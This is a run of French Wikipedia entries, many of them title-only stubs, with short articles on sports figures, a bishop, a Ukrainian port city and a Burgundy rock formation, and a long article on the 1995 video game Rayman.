<doc id="3214446" url="https://fr.wikipedia.org/wiki?curid=3214446" title="Hicham Chaabane">
Hicham Chaabane



</doc>
<doc id="3214447" url="https://fr.wikipedia.org/wiki?curid=3214447" title="Sidi Belhassen Chedly">
Sidi Belhassen Chedly



</doc>
<doc id="3214448" url="https://fr.wikipedia.org/wiki?curid=3214448" title="Kung fu (handball)">
Kung fu (handball)

Au handball, le kung-fu est un tir acrobatique dans lequel le tireur reçoit le ballon alors qu'il est en suspension au-dessus de la surface de but adverse puis tire en direction du but avant de toucher le sol. 
Cette figure a été inventée par le handballeur allemand Bernhard Kempa lorsqu'il évoluait dans son club de Frisch Auf Göppingen. Le geste est d'ailleurs aujourd'hui appelé Kempa-Trick (la feinte de Kempa) en allemand. 
En français, elle tire son nom de l'art martial du même nom, le kung-fu, et ce au moins depuis 1978 même si on lui attribue alors une origine japonaise.
Le kung-fu est l'équivalent du alley-oop au basket-ball.

</doc>
<doc id="3214450" url="https://fr.wikipedia.org/wiki?curid=3214450" title="Charles Muller">
Charles Muller



</doc>
<doc id="3214451" url="https://fr.wikipedia.org/wiki?curid=3214451" title="Glücksbourg">
Glücksbourg



</doc>
<doc id="3214458" url="https://fr.wikipedia.org/wiki?curid=3214458" title="Distribution empirique">
Distribution empirique



</doc>
<doc id="3214464" url="https://fr.wikipedia.org/wiki?curid=3214464" title="Godefroi Hermant">
Godefroi Hermant



</doc>
<doc id="3214466" url="https://fr.wikipedia.org/wiki?curid=3214466" title="WWE Tag Team Champion">
WWE Tag Team Champion



</doc>
<doc id="3214471" url="https://fr.wikipedia.org/wiki?curid=3214471" title="Tour d'Espagne 1959">
Tour d'Espagne 1959

La du Tour d'Espagne s'est déroulée entre le 24 avril et le entre Madrid et Bilbao. Il se composait de 17 étapes pour un total de . Il a été remporté par l'Espagnol Antonio Suárez.

</doc>
<doc id="3214473" url="https://fr.wikipedia.org/wiki?curid=3214473" title="Eutrope d'Orange">
Eutrope d'Orange

Eutrope, en latin "Eutropius", fut évêque d'Orange, au .
Biographie.
Né à Marseille sous le règne de l'empereur romain Honorius (395-423), il est issu d'une famille riche et noble. À la mort de sa femme, il se tourne vers Dieu sans modération, ce qui lui vaut d'être remarqué par l'évêque de Marseille Eustasius, qui lui propose alors d'entrer dans son clergé. Après plusieurs refus, Eutrope finit par accepter et se retrouve ordonné diacre.
En 463, après la mort de Juste, l'évêque d'Orange, il fut élu à l'unanimité pour être son successeur. Arrivé sur place, il fut effrayé par l'ampleur du travail qu'il allait lui falloir accomplir et prit la fuite. Un homme de Dieu nommé Aper arriva alors à le convaincre d'y retourner et de se consacrer à sauver son troupeau.
La vie qu'il mena alors le temps de son épiscopat, soit environ douze ans, fut extrêmement dure. Tout en administrant les paroissiens d'une cité en reconstruction, il n'hésitait pas à se consacrer à de nombreuses tâches manuelles, tantôt dans un champ où il peinait lui-même à la charrue, tantôt sur un chantier de construction où il portait des pierres même lorsque les autres ouvriers prenaient leur repas.
Sa "Vita" lui prête divers miracles : délivrance d'un possédé, guérison d'un païen estropié après avoir été frappé par la foudre, arrêt d'un incendie par la prière... On l'y voit également harcelé par le diable, lequel, une nuit, va jusqu'à lui voler son baluchon, et se montrera à lui seul au moment de son agonie, assis sur la planche servant de lit à Eutrope, mais s'évanouira dès que le saint l'apostrophera en invoquant Dieu.
Eutrope participa aux conciles d'Arles en 463 et en 475. 
Il mourut le et fut enseveli dans la basilique Saint-Julien-d'Antioche qu'il avait lui-même fait bâtir. 
Aux alentours de l'an 500, son successeur Verus écrivit sa "Vie" ("BHL" 2782) et rédigea aussi son épitaphe. 
Dans le recueil de lettres de Sidoine Apollinaire, une est adressée à Saint Eutrope ("Epist"., VI, 6 ; datée de Clermont, hiver 471-472), mais ne nous apprend pas grand-chose sur le personnage.
Représentation.
Le vitrail, datant du , au niveau de l'abside de la cathédrale Notre-Dame-de-Nazareth d'Orange, le représente.
Reliques.
La majeure partie de ses reliques reposent en la cathédrale d'Orange. Un reliquaire se trouve également dans l'église paroissiale Saint-Michel-et-Saint-Hippolyte de Reilhanette dans la Drôme. 

</doc>
<doc id="3214475" url="https://fr.wikipedia.org/wiki?curid=3214475" title="Coca-Cola Vanille">
Coca-Cola Vanille



</doc>
<doc id="3214481" url="https://fr.wikipedia.org/wiki?curid=3214481" title="Tchornomorsk">
Tchornomorsk

Tchornomorsk (en ) ou Tchernomorsk (en ) est une ville portuaire de l'oblast d'Odessa, en Ukraine. Sa population s’élevait à habitants en 2018.
Géographie.
Localisation.
Tchornomorsk est située sur la côte de la mer Noire, à au sud-sud-ouest d'Odessa et à au sud de Kiev.
Histoire.
Origine.
La région de la ville actuelle de Tchornomorsk a connu une occupation humaine très ancienne. Des traces de chasseurs de bisons remontant à ans ont été trouvées par des archéologues. À cette époque, le climat était beaucoup plus froid et le niveau de la mer Noire était inférieur de au niveau actuel, si bien que l’emplacement actuel d'Illitchivsk se trouvait alors à 120 ou de la côte. Des vestiges de l'âge du bronze et de la Grèce antique ont également été retrouvés dans la région.
À la fin du Moyen Âge, les marchands génois sont actifs dans l'estuaire du fleuve Soukhoï. La région est ensuite successivement soumise à la Horde d'or, au grand-duché de Lituanie, à la république des Deux Nations, au khanat de Crimée, à l'Empire ottoman et à l'Empire russe (1790).
En 1950, est décidée la création d'un chantier naval militaire sur l'estuaire du fleuve Soukhoï. La construction de barges commence dès l'année suivante, grâce à des dizaines de spécialistes transférés par le ministère de la Construction navale de l’Union soviétique depuis des chantiers de Kaliningrad, Vladivostok, Mykolaïv, etc. En , la localité, qui comptait alors habitants devient une commune urbaine et reçoit le nom d’Illitchiovsk, en l’honneur de Vladimir Illitch Lénine.
En 1956, est entreprise la construction d'un port de commerce destiné à désengorger le port d’Odessa, dont les possibilités d’extension sont limitées. Le , le cargo "Ukraine" chargé de charbon est le premier navire à entrer dans le port. La construction d'un port de pêche commence en 1964. L'année suivante le trafic du port de commerce dépasse celui du port d'Odessa. Le , la commune urbaine d'Illitchiovsk reçoit le statut de ville.
Le , à la suite de la loi sur la décommunisation des noms de lieux, la ville devenue entretemps en ukrainien Illitchivsk prend le nom de Tchornomorsk.
Population.
Recensements (*) ou estimations de la population :
Économie.
L'économie de Tchornomorsk repose sur le port et ses activités annexes comme la principale entreprise de pêche ukrainienne (Antarktika). Le port se classe au troisième rang des ports ukrainiens en 2005 avec un trafic de . L'économie de la ville est particulièrement dynamique et les revenus moyens de ses habitants sont les plus élevés d'Ukraine.

</doc>
<doc id="3214483" url="https://fr.wikipedia.org/wiki?curid=3214483" title="CEI aux Jeux olympiques d'été de 1992">
CEI aux Jeux olympiques d'été de 1992



</doc>
<doc id="3214484" url="https://fr.wikipedia.org/wiki?curid=3214484" title="CEI aux Jeux olympiques d'hiver de 1992">
CEI aux Jeux olympiques d'hiver de 1992



</doc>
<doc id="3214485" url="https://fr.wikipedia.org/wiki?curid=3214485" title="Michel Grossiord">
Michel Grossiord

Michel Grossiord, né à Lons-le-Saunier (Jura) en 1957, est un journaliste politique français de radio et de télévision.
Biographie.
Études.
Il étudie au Centre de formation des journalistes de Paris, d'où il sort en 1981.
Carrière.
Il intègre Europe 1 où, après avoir successivement été responsable de la rubrique culture puis présentateur d’"Europe-Midi", journal de la mi-journée, il présente la revue de presse du matin, intitulée "Lu dans la presse" depuis 2005. À la rentrée 2012, il présente le journal de 7 h et le flash de 9 h. 
En il présentera les journaux de 6 h 30 et 8 h 
, il présente également sur Public Sénat des éditions spéciales et "Le 19 H", le journal télévisé de la chaîne, ainsi que l'émission hebdomadaire "Preuves par trois", en partenariat avec l'AFP.
Pendant l'été 2014 puis pendant les fêtes de fin d'année puis à nouveau pendant les étés 2015 et 2016 il présente "Les 30 Glorieux", une chronique quotidienne dans la matinale où il reçoit des jeunes de 30 ans qui ont réussi.
En , il quitte Europe 1, après 33 ans de carrière dans cette radio. Il continue de travailler sur Public Sénat.
En , il intègre la matinale de Radio Classique pour présenter la revue de presse. Il y est remplacé par David Abiker en .

</doc>
<doc id="3214493" url="https://fr.wikipedia.org/wiki?curid=3214493" title="John Montague">
John Montague

John Patrick Montague est un poète irlandais né le à Brooklyn (New York) et mort le à Nice. 
Biographie.
John Montague est l'un des poètes anglophones contemporains les plus connus. Outre ses nombreux livres de poèmes, il a publié deux recueils de nouvelles et deux volumes de ses mémoires. En 1998, il est le premier à occuper la Chaire de Poésie d'Irlande (Ireland Chair of Poetry) nouvellement créée.
John Montague est, dans les années 1960, le correspondant de l"'Irish Times" à Paris, où il rencontre sa première épouse, Madeleine, et où il est proche de Samuel Beckett ainsi que de Claude Esteban dont il a traduit de nombreux poèmes en anglais.

</doc>
<doc id="3214496" url="https://fr.wikipedia.org/wiki?curid=3214496" title="Frédéric Marconato">
Frédéric Marconato

Frédéric Marconato, né le à Revel (Haute-Garonne), est un joueur rugby à XV français qui évolue au poste de pilier. Il mesure 1,81 m pour 110 kg.
Biographie.
Frédéric Marconato à l'occasion de servir de partenaire d'entraînement pour les All Blacks, le lors de la Coupe du monde en France.

</doc>
<doc id="3214497" url="https://fr.wikipedia.org/wiki?curid=3214497" title="Bernard Butler">
Bernard Butler

Bernard Joseph Butler est un guitariste britannique, né le à Stamford Hill, un quartier du East London.
Sa carrière professionnelle commence quand il est sélectionné comme guitariste du groupe britannique Suede en 1989.
En 2004, il retrouve Brett Anderson, ex-comparse de Suede, avec qui il fonde le groupe The Tears et enregistre l'album "".
À partir de 2008, il fait partie du groupe qui accompagne la chanteuse Duffy en tant que guitariste, pianiste et percussionniste.
En 2014, il accompagne l’ancien chanteur et musicien d'Everything but the Girl, Ben Watt, sur son album, "Hendra" et la tournée qui promeut cet album.

</doc>
<doc id="3214500" url="https://fr.wikipedia.org/wiki?curid=3214500" title="Charlotte Sometimes (homonymie)">
Charlotte Sometimes (homonymie)

Charlotte Sometimes peut désigner :

</doc>
<doc id="3214501" url="https://fr.wikipedia.org/wiki?curid=3214501" title="Gergely Ivanics">
Gergely Ivanics

Gergely Ivanics, né le à Pécs, est un coureur cycliste hongrois.

</doc>
<doc id="3214504" url="https://fr.wikipedia.org/wiki?curid=3214504" title="José Pedro Pérez-Llorca">
José Pedro Pérez-Llorca

José Pedro Pérez-Llorca Rodrigo, né le à Cadix et mort le à Madrid, est un homme politique espagnol. 
Ancien membre de l'Union du centre démocratique (UCD) et des premiers gouvernements démocratiques d'Espagne, il fait partie des sept pères de la Constitution de 1978.
Biographie.
Formation.
Après avoir passé avec succès son "bachillerato" à Cadix, José Pedro Pérez-Llorca suit des études supérieures de droit à l'université Complutense de Madrid, où il obtient sa licence avec le prix extraordinaire en 1964. Il passe ensuite plusieurs semestres ou trimestres à l'étranger, se perfectionnant notamment en droit constitutionnel.
Carrière dans la haute administration.
En 1965, José Pedro Pérez-Llorca réussit les concours du corps diplomatique et intègre alors le département de conseil juridique international du ministère des Affaires étrangères. Il participe notamment à la gestion de « l'affaire de la "Barcelona Traction, Light &amp; Power Company" », par laquelle la Cour internationale de justice reconnaît, en 1970, l'existence de droits "erga omnes" au niveau international.
Il change de corps en 1968, après avoir été reçu au concours du corps des avocats des Cortes Generales, mais quitte l'administration publique dès l'année suivante.
Activité dans le secteur privé.
José Pedro Pérez-Llorca devient aussitôt secrétaire général de la "Banca del Noroeste", avant de fonder en 1973 son propre cabinet d'avocats. Il suspend son activité en 1977, la reprenant en 1983. Il participe alors à la création du cabinet "García Añoveros &amp; Pérez-Llorca", dont il est le président. Il participe en outre à diverses procédures d'arbitrage et siègent dans plusieurs conseils d'administration.
Vie politique.
Un des pères de la Constitution.
Élu député de Madrid lors des élections constituantes de 1977, José Pedro Pérez-Llorca est désigné peu après membre du groupe des rapporteurs parlementaires du projet constitutionnel et porte-parole du groupe parlementaire de l'Union du centre démocratique (UCD). Le travail qu'il mène sur la future Loi fondamentale lui vaut, ainsi qu'à ses six collègues rapporteurs, le surnom de « père de la Constitution ».
Ministre à trois reprises.
Le , après avoir été réélu au Congrès des députés, José Pedro Pérez-Llorca est nommé ministre de la Présidence dans le nouveau gouvernement du centriste Adolfo Suárez. Lors du remaniement ministériel opéré par ce dernier le , il devient ministre de l'Administration territoriale, un poste qu'il quitte dès le 9 septembre pour celui de ministre des Affaires étrangères.
Il poursuit alors les négociations concernant l'adhésion de l'Espagne à l'OTAN, le nouveau traité de défense avec les États-Unis et poursuit les discussions sur l'entrée du pays dans la Communauté économique européenne (CEE), clôturant six chapitres. Après la très lourde défaite de l'UCD, qui sera dissoute en 1983, aux élections anticipées de 1982, il se retire de la vie politique.
Mort.
José Pedro Pérez-Llorca meurt le à Madrid à l'âge de , des suites d'une infection pulmonaire. Il est le cinquième rapporteur du projet constitutionnel à perdre la vie depuis l'entrée en vigueur de la Constitution de 1978.
Vie privée.
José Pedro Pérez-Llorca est marié avec Carmen Zamora et père de deux fils, tous les deux avocats.

</doc>
<doc id="3214506" url="https://fr.wikipedia.org/wiki?curid=3214506" title="Cauchemars">
Cauchemars



</doc>
<doc id="3214511" url="https://fr.wikipedia.org/wiki?curid=3214511" title="Zoltán Madaras">
Zoltán Madaras

Zoltán Madaras est un coureur cycliste hongrois né le à Szekszárd.
Biographie.
Vainqueur de trois étapes du Tour de Pecs en 2007 et 2008, épreuve non reconnue dans le calendrier continental de l'UCI, il termine deuxième du championnat de Hongrie du contre-la-montre derrière l'intouchable László Bodrogi. Puis il prend sa revanche trois jours après en devenant champion de la course en ligne.

</doc>
<doc id="3214513" url="https://fr.wikipedia.org/wiki?curid=3214513" title="Banque de l’Indochine">
Banque de l’Indochine



</doc>
<doc id="3214515" url="https://fr.wikipedia.org/wiki?curid=3214515" title="Zoltan Madaras">
Zoltan Madaras



</doc>
<doc id="3214519" url="https://fr.wikipedia.org/wiki?curid=3214519" title="Jaime Milans del Bosch">
Jaime Milans del Bosch

Jaime Milans del Bosch y Ussía (né à Madrid le , mort dans la même ville le ) est un militaire espagnol qui fut lieutenant général de l'armée espagnole et capitaine général de la (Valence).
Biographie.
Il a combattu pendant la Seconde Guerre mondiale sur le front de l'Est dans les rangs de la Division Azul et a de ce fait été décoré de la croix de fer.
Après être rentré en Espagne, devenu général, il prend le commandement de la division blindée Brunete, unité d'élite stationnée aux portes de Madrid. Toutefois ses positions politiques lui valurent de perdre ce commandement après la mort de Franco.
Partisan de la fin de la transition démocratique espagnole et le retour d'un gouvernement militaire, il est l'un des protagonistes principaux du coup d'État du 23 février, durant lequel il fait quadriller par ses chars les rues de Valence. Après l'échec du coup d'État, il est destitué le , puis jugé le , avec trente autres personnes, et condamné à trente ans de prison.
Libéré en 1991, il meurt en 1997 d'une tumeur au cerveau.

</doc>
<doc id="3214520" url="https://fr.wikipedia.org/wiki?curid=3214520" title="Roche de Vergisson">
Roche de Vergisson

La roche de Vergisson est un sommet calcaire situé sur la commune française de Vergisson, en Saône-et-Loire.
Géographie.
Topographie.
La roche de Vergisson est un escarpement abrupt situé sur la commune de Vergisson, en Saône-et-Loire, dans le Sud de la Bourgogne-Franche-Comté, à moins de deux kilomètres à vol d'oiseau de la roche de Solutré. Elle culmine à 483 mètres, soit 10 mètres de moins que sa voisine.
Géologie.
La roche de Vergisson a la même histoire géologique que la roche de Solutré : massif corallien au Secondaire, soulèvement et basculement vers l'est au Tertiaire, puis érosions diverses.
Histoire.
Préhistoire.
Durant la Préhistoire, la roche fut fréquentée par des groupes néandertaliens. On y a retrouvé plusieurs ossements de cette espèce humaine proche de la nôtre.
Histoire contemporaine.
Alphonse de Lamartine, à propos de Solutré et de Vergisson, y voit .
Le , elle fut exceptionnellement gravie par le président de la République François Mitterrand, qui voulut échapper aux manifestants (agriculteurs, anciens d'Algérie) et aux journalistes qui l'attendaient au pied de la roche de Solutré dans le cadre de son ascension rituelle.
Activités.
Viticulture.
Sur les pentes de la roche de Vergisson, on trouve des vignes quadrillées de murets de pierres sèches, les murgers. Y sont représentés les vignobles de pouilly-fuissé (AOC), saint-véran (AOC) et de mâcon (AOC).
Protection environnementale.
L'ensemble constitué par les roches de Solutré et de Vergisson, et le mont Pouilly, est classé « site naturel et rural » depuis 1955. Les pelouses calcicoles sont sous protection Natura 2000. L'ensemble des communes est au cœur du Grand Site de France Solutré Pouilly Vergisson.
Sport.
Les falaises calcaires de la roche de Vergisson constituent, avec la falaise de Remigny, l'un des deux plus grands sites d'escalade du département, avec 122 voies recensées.
Chaque année se déroule la « randonnée des deux Roches », qui relie Solutré à Vergisson.

</doc>
<doc id="3214526" url="https://fr.wikipedia.org/wiki?curid=3214526" title="Timofey Kritskiy">
Timofey Kritskiy

Timofeï Viktorovitch Kritski - en russe : - et en anglais : Timofey Kritskiy, forme la plus souvent utilisée, (né le à Tchernenko) est un coureur cycliste russe.
Biographie.
Membre de l'équipe continentale Katyusha en 2008 et 2009, Timofey Kritskiy remporte huit courses du calendrier de l'UCI Europe Tour 2008, dont le GP Tell. Avec l'équipe de Russie, il obtient deux médailles lors des championnats d'Europe sur route espoirs : l'argent au contre-la-montre et le bronze à la course en ligne. En fin d'année, il est du classement individuel de l'UCI Europe Tour, et meilleur coureur de moins de 23 ans. En 2009, il gagne six fois et finit de l'UCI Europe Tour. Avec l'équipe de Russie, il est de nouveau médaillé d'argent au contre-la-montre des championnats d'Europe espoirs. En septembre, il participe au Tour de l'Avenir. Il en remporte l'étape-reine à Gérardmer en battant au sprint Romain Sicard, vainqueur final de l'épreuve, avec qui il s'est échappé. Deux jours plus tard, alors qu'il figure à la deuxième place du classement général, il chute lors de l'avant-dernière étape, disputée contre-la-montre, et souffre d'une fracture ouverte de la jambe gauche. Sa saison est alors terminée. Malgré cette chute, il intègre en 2010 l'équipe ProTour Katusha, dont l'équipe continentale Katyusha constitue la réserve. La période de convalescence suivant sa blessure l'empêche toutefois de courir en compétition avant le mois de septembre.

</doc>
<doc id="3214531" url="https://fr.wikipedia.org/wiki?curid=3214531" title="Alexei Leonov">
Alexei Leonov



</doc>
<doc id="3214535" url="https://fr.wikipedia.org/wiki?curid=3214535" title="Rayman (jeu vidéo)">
Rayman (jeu vidéo)

 est un jeu vidéo de plateformes en 2D à défilement horizontal, développé par Ludimédia (plus tard devenu Ubisoft Montpellier), et édité par Ubisoft. D'abord développé pour la console Jaguar, il est commercialisé en septembre 1995 sur cette dernière ainsi que sur PlayStation. Le jeu est ensuite adapté sur Saturn et sur MS-DOS/Windows ; ces versions sont commercialisées également en 1995. Des adaptations sur d'autres supports sortent par la suite : en 2000 sur Game Boy Color et sur Game Boy Advance en 2001. Le jeu est aussi disponible par achat en ligne sur PlayStation Portable et PlayStation 3 depuis 2008, sur Nintendo DS depuis 2009, et sur iOS depuis 2016 ; en 2018, il fait partie des titres intégrés à la PlayStation Classic.
Le joueur incarne Rayman, qui doit poursuivre Mister Dark pour récupérer le Grand Protoon, un artéfact faisant régner l'équilibre et l'harmonie. Le vol de cet artéfact cause la mise en cage des Électoons, de petites créatures qui gravitaient autour du Grand Protoon. Pour sauver le monde, Rayman doit les libérer à travers cinq différents mondes, puis combattre . Dark au Palais des délices.
Michel Ancel conçoit ' à l'adolescence et concrétise son idée après avoir été embauché par Ubisoft en 1989. Il intègre plusieurs souvenirs d'enfance dans la conception du jeu et est rapidement rejoint par une équipe plus importante. ' est le premier opus marquant significativement les débuts de la franchise éponyme, comprenant plusieurs suites et divers produits dérivés. Le jeu est un succès commercial, et il reçoit des critiques positives, saluant son atmosphère, ses visuels et sa bande-son, bien que certaines lui reprochent sa difficulté élevée et son manque d'originalité.
Le 23 Septembre 2025, à l'occasion des 30 ans de Rayman. ModRetro et Ubisoft ont réédité la version Game Boy Color du jeu avec des nouvelles musiques et un nouveau niveau. Cette reedition est jouable sur une Game Boy Color et Chromatic.
Scénario.
L'équilibre cosmique de l'univers de "" est maintenu par un artéfact connu sous le nom de Grand Protoon. Un jour, cependant, le maléfique Mister Dark décide de le voler après avoir réussi à vaincre Betilla, la fée qui tentait de protéger l’artefact. Les Électoons, des petites créatures roses et jaunes gravitant autour du Grand Protoon, sont alors éparpillés dans le monde, désormais corrompu, puis capturés par des ennemis. Le Magicien fait appel à Rayman pour libérer les Électoons, vaincre . Dark et remettre la main sur le Grand Protoon.
Rayman commence son périple dans la Forêt des songes. Il y rencontre la fée Betilla, qui le dote du pouvoir de frapper ses adversaires à coups de poing. Le premier antagoniste rencontré est Bzzit, un moustique aux proportions gigantesques. Rayman le vainc, se lie d'amitié avec lui, Bzzit l'aide à traverser le niveau en survolant le lagon sur son dos. Betilla confère par la suite à Rayman la capacité de s'accrocher à diverses plateformes. Dans l'Antre des moustiques, Rayman réussit à vaincre Moskito, le boss de fin de niveau, et Betilla lui donne le pouvoir de s'accrocher à des anneaux flottants. Rayman parvient ensuite au second niveau, Le Ciel chromatique, une région principalement composée d'instruments et de notes de musique. À la fin du niveau, il fait la rencontre du boss . Sax, un saxophone géant. Betilla lui attribue par la suite le pouvoir de l'hélicoptère, la capacité de voler sur une petite distance en faisant tournoyer ses cheveux. Rayman atteint alors l'antre de . Sax et parvient à le vaincre.
Dans les Montagnes bleues, Rayman fait la rencontre du Musicien, dont la guitare a été écrasée par la chute d'un rocher. Pour le consoler, Rayman lui sculpte à coups de poing une nouvelle guitare à partir d'un rocher placé devant lui. Pour le remercier, le Musicien offre à Rayman une fiole qui lui octroie le pouvoir du super-hélicoptère, la même capacité de voler mais à longue distance. Arrivé à destination, Rayman fait la rencontre de . Stone, un homme de pierre géant. Une fois . Stone vaincu, Betilla fait don à Rayman de la capacité de courir à grande vitesse. Au quatrième niveau, Rayman parvient à la Cité des images, une plateforme entièrement composée de matériels artistiques. Après avoir atteint la Crique aux crayons, Rayman fait deux fois la rencontre de Space Mama, une comédienne déguisée en Viking puis en spationaute, qu'il parvient à vaincre. Rayman apprend par la suite que . Dark a enlevé Betilla. Au cinquième niveau, Rayman arrive aux Caves de Skops, dans lesquelles il fait la rencontre de Skops, un scorpion géant rouge vif et fuchsia. Après la défaite de Skops, Rayman entend la fée crier à l'aide.
Pour parvenir au Château des délices, un niveau constitué de sucreries, Rayman doit fracasser les dans lesquelles les Électoons ont été retenus prisonniers à travers les cinq niveaux précédents. Après avoir échappé à son double maléfique, Rayman fait face à . Dark, qu'il réussit difficilement à battre. Un épilogue apparaît ensuite montrant le prompt rétablissement du Grand Protoon, la libération de Betilla, ainsi que Rayman prenant du bon temps avec ses alliés et ses anciens ennemis.
Système de jeu.
' est un jeu vidéo de plateformes utilisant un moteur graphique en 2D à ' horizontal, incorporant une animation humoristique et cartoonesque. Le joueur contrôle Rayman, qui doit traverser six mondes thématiques dans le but de récupérer le Grand Protoon. Chacun de ces mondes, à l'exception du dernier, est subdivisé en plusieurs niveaux obligatoires pour progresser. Chaque niveau renferme six cages contenant des Électoons prisonniers que Rayman peut libérer. Les mondes sont reliés entre eux par une carte du monde ; au sein de ceux-ci, la progression n'est pas linéaire : le joueur a régulièrement le choix entre deux niveaux différents. Il est nécessaire de retourner dans les niveaux déjà achevés une fois de nouveaux pouvoirs acquis (comme le vol ou le poing télescopique), afin d'atteindre des zones inaccessibles auparavant et de pouvoir collecter la totalité des Électoons et des objets.
Au cours de l’aventure, Rayman acquiert de nouvelles capacités, comme voler, courir ou se suspendre à des plateformes. Ses mains détachées subissent aussi des améliorations : il peut ainsi attraper des objets à distance ou donner des coups de poing étendus, une technique appelée le . Le joueur peut collecter des cristaux bleus, et gagner une vie supplémentaire dès qu’il en obtient 100. Si le joueur perd ses cinq vies, il doit charger sa sauvegarde, utiliser un « Continue » ou recommencer le jeu. Les « Continues » sont limités, et la sauvegarde se fait soit par fichier (sur CD), soit par mot de passe (dans la version Jaguar). Enfin, il est possible d'utiliser des codes de triche comme «  » pour déjouer la difficulté élevée du jeu ; Ubisoft fournit ces codes et un guide de jeu sur son site officiel.
Rayman doit affronter un boss à la fin de chaque monde, ce qui nécessite d'utiliser les capacités acquises précédemment. En libérant tous les Électoons dans les cinq premiers mondes, il obtient l'accès au monde final, le Château des délices, repaire du boss final, M. Dark. Lorsque Rayman interagit avec le Magicien, caché à différents endroits des niveaux, il peut accéder à des salles secrètes. S'il réussit à les terminer dans un temps imparti, il reçoit des cristaux bleus ou des vies supplémentaires.
Développement.
Origines et premiers concepts.
Le personnage de Rayman provient de croquis dessinés par le graphiste français Michel Ancel. Adolescent, lors d'un dîner familial, Michel demande à ses parents d'investir dans un ordinateur qui pourrait lui permettre de trouver un travail. Il imagine le personnage dans les années 1980, alors qu'il apprend à dessiner, composer de la musique et programmer pour réaliser son rêve de créer des jeux vidéo. Avec ce nouvel outil, il programme et conceptualise ses premiers jeux vidéo, avec l'aide de son collègue Nicolas Choukroun. Il met alors au point des jeux de réflexion, comme ', ou un , ', sur Atari ST. En 1988, ses compétences en animation lui valent d'être l'un des premiers employés du jeune éditeur Ubisoft, qui opère alors depuis Montreuil avec seulement six développeurs.
L'un des fondateurs d'Ubisoft, Yves Guillemot, encourage Ancel à présenter ses idées de jeu à la direction. Il travaille seul sur un prototype basé sur son concept de "" pour l'Atari ST, passant six mois à développer un système d'animation. Bien que la technologie présentée en soit encore au stade de la recherche et développement, Serge Hascoët insiste pour que le jeu entre en production, ce que Michel Guillemot accepte de prendre en charge.
En 1992, Michel Ancel et Frédéric Houde planchent sur le développement d'un premier prototype, avec une totale liberté artistique. Le projet est un jeu de plateforme en 2D comportant un mode multijoueur. Le style du jeu s'inspire des contes celtes, chinois et russes, mais aussi de l'enfance d'Ancel, qui passait son temps près des rivières, à chasser des insectes et à grimper aux arbres. Lorsqu'il commence à travailler sur le jeu, Ancel s'attelle d'abord aux designs des arbres et des créatures. Fasciné par les outils de rendu comme Autodesk 3ds Max, il opte pour des animations en . Houde trouve cela impressionnant, à une époque où la plupart des jeux utilisent des animés à cinq images par seconde. La version définitive du jeu affiche par seconde, et utilise une palette de .
Conception.
Le développement de ' connaît un rebondissement lorsque Michel Ancel constate le déclin d'intérêt pour l'Atari ST. Il réoriente alors le projet vers l’extension CD-ROM de la Super Nintendo. Mais lorsque Nintendo annule l'accessoire en 1993, cette version du jeu est également abandonnée. Considérée comme un média perdu pendant des années, la version Super NES CD-ROM de ' refait surface en lorsque Houde redécouvre par hasard une copie datant de 1992. Avec son autorisation, le programmeur Omar Cornut publie cette version prototype en ligne en , permettant aux fans de découvrir cette pièce historique du jeu vidéo.
Le jeu bénéficie d'un important soutien financier et humain, Michel Guillemot allouant de francs au projet et renforçant l'équipe de développement. La production s'organise alors sur deux sites, le siège d'Ubisoft à Montreuil pour les aspects techniques, et Montpellier, la ville natale d'Ancel, pour la création. L'équipe s'étoffe jusqu'à compter . Face aux capacités techniques limitées des consoles existantes, l'équipe se tourne vers l'Atari Jaguar, estimant qu'elle peut supporter leurs ambitions graphiques. Par la suite, le jeu est également adapté pour la PlayStation et la Sega Saturn, dont le matériel plus performant permet de mieux réaliser leur vision. Ubisoft en fait même un titre de lancement de la PlayStation en Amérique du Nord et en Europe, stratégie visant à surpasser les jeux de plateformes japonais en profitant de la sortie simultanée d'une nouvelle console puissante.
Le personnage, à l'aspect cartoonesque, est représenté par un torse violet sans bras ni jambes portant des gants blancs, des baskets jaunes et un foulard rouge. Durant l'édition 2001 de l'E3, Ancel explique lors d'une entrevue avec "L'Express" : 
La musique du jeu ne manque pas d'influences, allant du jazz au rock, elle s'apparente beaucoup à de la musique progressive. Rémi Gazel, autodidacte et passionné de musique assistée par ordinateur, est un des compositeurs ayant travaillé sur la majorité des musiques du jeu. Aucun enregistrement d'instrument réel n'est utilisé pour la réalisation de la bande son originale : toute la musique du jeu est produite à partir de synthétiseurs.
Promotion et commercialisation.
"" fait sa première apparition publique sur Jaguar lors du Consumer Electronics Show de l'été 1994. Fin 1994, des publicités dans les magazines annoncent le jeu comme un titre phare de la Jaguar, prévu pour une sortie à l'automne ou . Les premières promotions de la PlayStation au Japon évoquent quant à elles une date de sortie prévue le . Par la suite, la presse japonaise reporte cette date à pour la version PlayStation. Aux États-Unis, les magazines anticipent également une sortie sur Jaguar pour , tout en mentionnant des versions d'abord prévues sur 32X et 3DO, finalement annulées.
' sort finalement sur Jaguar le en Europe et le aux États-Unis. Le même mois, "Rayman" est publié sur PlayStation lors du lancement de la console, le en Amérique du Nord et le en Europe. Le jeu paraît ensuite sur Sega Saturn en novembre de la même année{, avant d'arriver sur MS-DOS et Windows en en Europe, puis en sur le marché nord-américain. Ce même mois, une démo présentant le premier des six mondes du jeu est rendue disponible pour les versions PlayStation et Sega Saturn. Le jeu est par la suite adapté sur de nombreux autres supports, notamment sur Game Boy Color en 2000, et sur Game Boy Advance en 2001 sous le titre '. Plus tard, en 2008, il est également disponible par achat en ligne sur PlayStation Portable et PlayStation 3, sur Nintendo DS le , sur iOS le et Android le , sous le titre "". Le jeu est un des vingt titres inclus dans la déclinaison occidentale de la PlayStation Classic sortie en 2018. Des versions SNES et Gizmondo sont annoncées et finalement annulées.
Dès sa commercialisation, "" est classifié (« enfants et adultes ») par le système de classification nord-américain Entertainment Software Rating Board (ESRB), toutes versions et plateformes confondues. Différents éléments sont ajoutés ou supprimés selon les supports.
Accueil.
Accueil critique.
' reçoit un accueil généralement positif à sa sortie, les critiques saluant ses animations, son atmosphère et sa bande-son. ' le décrit comme l'un des meilleurs jeux sur Atari Jaguar, mettant en avant ses prouesses techniques, tout en le jugeant inférieur à la version PlayStation. "Electronic Gaming Monthly" qualifie la version Jaguar de jeu de plateformes exceptionnel, mais moins réussie que celle de la PlayStation en raison d'une qualité audio inférieure et de contrôles moins réactifs. ' loue cependant la précision des commandes, cruciale pour les nombreux sauts, esquives et mouvements requis. Un autre journaliste de ' voit dans la version PlayStation un , l'érigeant parmi les jeux les plus impressionnants visuellement de l'époque.
